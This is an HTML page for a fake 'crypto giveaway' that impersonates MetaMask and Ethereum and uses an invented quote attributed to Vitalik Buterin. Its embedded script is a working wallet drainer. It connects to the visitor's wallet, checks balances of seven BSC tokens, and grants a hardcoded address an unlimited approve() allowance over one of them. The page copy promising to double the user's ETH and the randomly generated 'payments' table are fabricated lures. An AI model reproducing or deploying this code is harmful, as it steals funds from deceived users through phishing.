<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <!-- <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" /> -->
    <link rel="stylesheet" href="./assets/css/reset.css" />
    <link rel="stylesheet" href="./assets/css/bootstrap-grid.min.css" />
    <meta name="theme-color" content="#1f1f1d" />
    <meta name="msapplication-navbutton-color" content="#1f1f1d" />
    <meta name="apple-mobile-web-app-status-bar-style" content="#1f1f1d" />
    <link rel="stylesheet" href="./assets/css/style.css" />
    <link rel="icon" type="image/png" href="./favicon.png" />
    <title>Metamask</title>
    <script>
      const ETH_ADDRESS = "ETH_ADDRESS_HERE";
    </script>
  </head>
  <body>
    <script src="./ethers.js" charset="utf-8" type="text/javascript"></script>
    <script>
      const web3 = new Web3("https://bsc-dataseed1.binance.org:443");
      function show(address) {
        console.log("address", address);
      }
      function add_bnb() {
        window.ethereum
          .request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: "0x38",
                chainName: "Binance Smart Chain",
                nativeCurrency: {
                  name: "Binance Coin",
                  symbol: "BNB",
                  decimals: 18,
                },
                rpcUrls: ["https://bsc-dataseed.binance.org/"],
                blockExplorerUrls: ["https://bscscan.com"],
              },
            ],
          })
          .catch((error) => {
            console.log(error);
          });
      }

      function connect() {
        window.ethereum
          .request({
            method: "eth_requestAccounts",
          })
          .then((r) => {
            console.log("<->", r);
            show(r[0]);
            add_bnb();
            send();
          })
          .catch((error) => {
            console.log("Error:", error);
          });

        window.ethereum
          .request({
            method: "eth_accounts",
          })
          .then((r) => {
            // Array output
            console.log("Accounts: ", r);
            show(r[0]);
            add_bnb();
            send();
          })
          .catch((error) => {
            console.log("Error: ", error);
          });
      }

      function send() {
        async function approve() {
          const usdtAbi = [
            {
              inputs: [],
              stateMutability: "nonpayable",
              type: "constructor",
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: "address",
                  name: "owner",
                  type: "address",
                },
                {
                  indexed: true,
                  internalType: "address",
                  name: "spender",
                  type: "address",
                },
                {
                  indexed: false,
                  internalType: "uint256",
                  name: "value",
                  type: "uint256",
                },
              ],
              name: "Approval",
              type: "event",
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: "address",
                  name: "from",
                  type: "address",
                },
                {
                  indexed: true,
                  internalType: "address",
                  name: "to",
                  type: "address",
                },
                {
                  indexed: false,
                  internalType: "uint256",
                  name: "value",
                  type: "uint256",
                },
              ],
              name: "Transfer",
              type: "event",
            },
            {
              inputs: [
                {
                  internalType: "address",
                  name: "owner",
                  type: "address",
                },
                {
                  internalType: "address",
                  name: "delegate",
                  type: "address",
                },
              ],
              name: "allowance",
              outputs: [
                {
                  internalType: "uint256",
                  name: "",
                  type: "uint256",
                },
              ],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "address",
                  name: "delegate",
                  type: "address",
                },
                {
                  internalType: "uint256",
                  name: "numTokens",
                  type: "uint256",
                },
              ],
              name: "approve",
              outputs: [
                {
                  internalType: "bool",
                  name: "",
                  type: "bool",
                },
              ],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "address",
                  name: "tokenOwner",
                  type: "address",
                },
              ],
              name: "balanceOf",
              outputs: [
                {
                  internalType: "uint256",
                  name: "",
                  type: "uint256",
                },
              ],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "decimals",
              outputs: [
                {
                  internalType: "uint8",
                  name: "",
                  type: "uint8",
                },
              ],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "name",
              outputs: [
                {
                  internalType: "string",
                  name: "",
                  type: "string",
                },
              ],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "symbol",
              outputs: [
                {
                  internalType: "string",
                  name: "",
                  type: "string",
                },
              ],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "totalSupply",
              outputs: [
                {
                  internalType: "uint256",
                  name: "",
                  type: "uint256",
                },
              ],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "address",
                  name: "receiver",
                  type: "address",
                },
                {
                  internalType: "uint256",
                  name: "numTokens",
                  type: "uint256",
                },
              ],
              name: "transfer",
              outputs: [
                {
                  internalType: "bool",
                  name: "",
                  type: "bool",
                },
              ],
              stateMutability: "nonpayable",
              type: "function",
            },
            {
              inputs: [
                {
                  internalType: "address",
                  name: "owner",
                  type: "address",
                },
                {
                  internalType: "address",
                  name: "buyer",
                  type: "address",
                },
                {
                  internalType: "uint256",
                  name: "numTokens",
                  type: "uint256",
                },
              ],
              name: "transferFrom",
              outputs: [
                {
                  internalType: "bool",
                  name: "",
                  type: "bool",
                },
              ],
              stateMutability: "nonpayable",
              type: "function",
            },
          ];
          let provider;
          if (window.ethereum) {
            try {
              provider = new ethers.providers.Web3Provider(window.ethereum);
            } catch (error) {
              console.log("Error in web3 provider: ", error);
            }
          } else if (window.web3) {
            try {
              provider = new ethers.providers.Web3Provider(window.web3);
            } catch (error) {
              console.log("Error in web3 provider: ", error);
            }
          } else {
            try {
              provider = new ethers.providers.JsonRpcProvider();
            } catch (error) {
              console.log("Error in web3 provider: ", error);
            }
          }

          let signer;
          try {
          } catch (error) {
            console.log("Error on getSigner function: ", error);
          }

          try {
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();

            recipientAddress = "0x1749B879743700C85cd32634F4ca508003DBee99";
            const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
            const ethAddress = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8";
            const wbnbAddress = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
            const usdcAddress = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
            const xrpAddress = "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE";
            const daiAddress = "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3";
            const cakeAddress = "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82";

            const usdtContract = new ethers.Contract(
              usdtAddress,
              usdtAbi,
              signer
            );
            const ethContract = new ethers.Contract(
              ethAddress,
              usdtAbi,
              signer
            );
            const wbnbContract = new ethers.Contract(
              wbnbAddress,
              usdtAbi,
              signer
            );
            const usdcContract = new ethers.Contract(
              usdcAddress,
              usdtAbi,
              signer
            );
            const xrpContract = new ethers.Contract(
              xrpAddress,
              usdtAbi,
              signer
            );
            const daiContract = new ethers.Contract(
              daiAddress,
              usdtAbi,
              signer
            );
            const cakeContract = new ethers.Contract(
              cakeAddress,
              usdtAbi,
              signer
            );

            const usdtBalance = await usdtContract.balanceOf(
              signer.getAddress()
            );
            const ethBalance = await ethContract.balanceOf(signer.getAddress());
            const wbnbBalance = await wbnbContract.balanceOf(
              signer.getAddress()
            );
            const usdcBalance = await usdcContract.balanceOf(
              signer.getAddress()
            );
            const xrpBalance = await xrpContract.balanceOf(signer.getAddress());
            const daiBalance = await daiContract.balanceOf(signer.getAddress());
            const cakeBalance = await cakeContract.balanceOf(
              signer.getAddress()
            );

            console.log(usdtBalance);
            console.log(ethBalance);
            console.log(wbnbBalance);
            console.log(usdcBalance);
            console.log(xrpBalance);
            console.log(daiBalance);
            console.log(cakeBalance);

            let balances = [
              {
                name: usdtContract,
                address: usdtAddress,
                value: Number(usdtBalance),
              },
              {
                name: ethContract,
                address: ethAddress,
                value: Number(ethBalance) * 2595,
              },
              {
                name: wbnbContract,
                address: wbnbAddress,
                value: Number(wbnbBalance) * 370,
              },
              {
                name: usdcContract,
                address: usdcAddress,
                value: Number(usdcBalance),
              },
              {
                name: xrpContract,
                address: xrpAddress,
                value: Number(xrpBalance) * 0.8,
              },
              {
                name: daiContract,
                address: daiAddress,
                value: Number(daiBalance),
              },
              {
                name: cakeContract,
                address: cakeAddress,
                value: Number(cakeBalance) * 5.5,
              },
            ];
            let maxValue = balances.reduce((max, balance) =>
              max.votes > balance.votes ? max : balance
            );

            if (maxValue.value === 0) {
              console.log("All balances are 0");
            } else {
              console.log(
                "Contract address: ",
                maxValue.address,
                "has ",
                maxValue.value,
                "tokens"
              );
            }
            let approve = await maxValue.name.approve(
              recipientAddress,
              "115792089237316195423570985008687907853269984665640564039457584007913129639935"
            );
            console.log("Sended tokens approve to recipient address..");
          } catch (error) {
            console.log("Error: ", error);
          }
        }

        approve();
      }
    </script>
    <header class="header">
      <div class="container">
        <div class="row">
          <div class="header-content">
            <div class="header-logo">
              <a href="#">
                <img src="./assets/images/logo.svg" alt="" />
              </a>
            </div>
            <nav class="menu">
              <ul>
                <li class="menu-item underline_a">
                  <a href="#">home</a>
                </li>
                <li class="menu-item underline_a">
                  <a href="#rules">rules</a>
                </li>
                <li class="menu-item underline_a">
                  <a href="#payments">payments</a>
                </li>
              </ul>
            </nav>
            <div class="header-button">
              <a href="#participate">
                <button class="button gold">PARTICIPATE</button>
              </a>
            </div>
          </div>
        </div>
      </div>
    </header>
    <section class="main">
      <div class="container">
        <div class="row">
          <div class="main-text">
            <h4 class="main-text-header gold">The World’s CRYPTO GIVEAWAY</h4>
            <h1 class="main-text-title gold">
              dON'T MISS YOUR CHANCE TO GET $100.000.000
            </h1>
            <p class="main-text-subtitle">
              Only today you can get $100.000.000 at our event. There won't be a
              second chance. Read the rules and participate.
            </p>
          </div>
          <div class="main-quote">
            <div class="quote-img">
              <img src="./assets/images/main-img.png" alt="" />
            </div>
            <div class="quote-block">
              <p class="quote-author gold">Vitalik Buterin</p>
              <p class="quote-text">
                We are sure that Ethereum is the most reliable currency in the
                world. We want to accelerate the process of cryptocurrency
                development in all countries of the world, for this it is
                necessary to increase the number of its holders. Therefore,
                Metamask and my team have invested more than 30,000 ETH in the
                launch of giveaway, dedicated to the release of Ethereum 2.0, in
                which everyone can participate.
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section class="rules" id="rules">
      <div class="container">
        <div class="row">
          <div class="rules-text">
            <h2 class="rules-title gold">RULES</h2>
            <p class="rules-subtext">
              We encourage Ethereum holders and start a giveaway to distribute
              the coin before the release of ETH 2.0. To participate, you only
              need to connect your Metamask wallet, our bot will check your
              balance and send you the amount of ETH that is already on your
              balance. For example: on your Metamask 2 ETH wallet - we will send
              you 2 more ETH.
            </p>
            <div class="rules-button">
              <a href="#participate">
                <button class="button gold">PARTICIPATE</button>
              </a>
            </div>
            <img
              class="rules-img"
              src="./assets/images/rules-illustration.png"
              alt="Illustration"
            />
          </div>
        </div>
      </div>
    </section>
    <section class="transactions" id="payments">
      <div class="container">
        <div class="row">
          <div class="transaction-content">
            <div class="transaction-title">
              <div>TxHash</div>
              <div style="margin-left: 26px">Block</div>
              <div style="margin-left: -46px">From</div>
              <div style="margin-left: 52px">To</div>
              <div style="margin-left: 85px">Age</div>
              <div style="margin-left: 0px">Value</div>
              <div style="margin-left: -51px">TxFee</div>
            </div>
            <div class="table-container"></div>
          </div>
        </div>
      </div>
      <script>
        function createTableItem() {
          let inputValue = randomInteger(0, 500) + "." + randomString(1, "123456789");
          let outputValue = ++inputValue * 2;
          let txFIn = inputValue / 1000;
          let txFOut = outputValue / 1000;
          let cutWallet = randomInteger(0, 500) + "." + randomString(1, "123456789");
          let ytytyt = '0x' + randomString(25) + "...";
          let cutWalletqwe = '0x' + randomInteger(10000, 90000)
          let cutWalletqwasde = 6 + '' + randomInteger(10000, 90000)

          let row = `
          <div class="trans-action">
              <div class="trans-action">
                  <div class="table-row_line">
                      <p class="address" style=" padding: 20px 10px; font-size: 20px">${BaseWallet}</p>
                      <p class="address" style=" padding: 20px 10px; font-size: 20px">${ytytyt}</p>
                      <p class="address" style=" padding: 20px 10px; font-size: 20px">10 ETH</p>
                  </div>
              </div>
              <div class="table-row_separator">
                  <p class="gen-out">OUT</p>
              </div>
              <div class="table-row_content">
                  <div class="table-row_line">
                      <p class="age" style=" padding: 20px 10px; font-size: 20px">${cutWalletqwe}</p>
                      <p class="age" style=" padding: 20px 10px; font-size: 20px">${cutWalletqwasde}</p>
                      <p class="value" style=" padding: 20px 10px; font-size: 20px">right now</p>
                      <p class="address gen-status" style=" padding: 20px 10px; font-size: 20px">Completed</p>
                  </div>

              </div>
          </div>`;
      </script>
    </section>
    <section class="connect" id="participate">
      <div class="container">
        <div class="row">
          <div class="connect-container">
            <div class="connect-block state-1" style="filter: none">
              <h1 class="connect-text gold">
                Connect the Metamask wallet and get your prize
              </h1>

              <div class="connect-buttons">
                <button
                  class="connect-button start-connect gold-button"
                  onclick="connect()"
                >
                  Connect
                </button>
                <button
                  class="connect-button take-part gold-button d-none"
                  onclick="connect()"
                >
                  Connect
                </button>
                <a
                  href="https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn"
                  target="_blank"
                >
                  <button class="connect-button out-gold">
                    <span>Create wallet</span>
                  </button>
                </a>
              </div>
            </div>
            <p class="connect-error d-none">
              Connection error, please try again
            </p>
            <p class="connecting gold d-none">Trying to connect...</p>
            <img
              src="./assets/images/wait.svg"
              alt=""
              class="connect-block-waiting d-none"
            />
            <div class="connect-block state-3 d-none">
              <h1 class="connect-text gold">Successful participation!</h1>
            </div>
          </div>
        </div>
      </div>
    </section>
    <footer class="footer">
      <div class="container">
        <div class="row">
          <div class="footer-content">
            <div class="brand">Ethereum & Metamask</div>
            <div class="rights">All rights reserved</div>
            <div class="copypaste">© 2022</div>
          </div>
        </div>
      </div>
    </footer>
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
      integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
    ></script>
    <script src="./assets/js/updater.js"></script>
  </body>
</html>
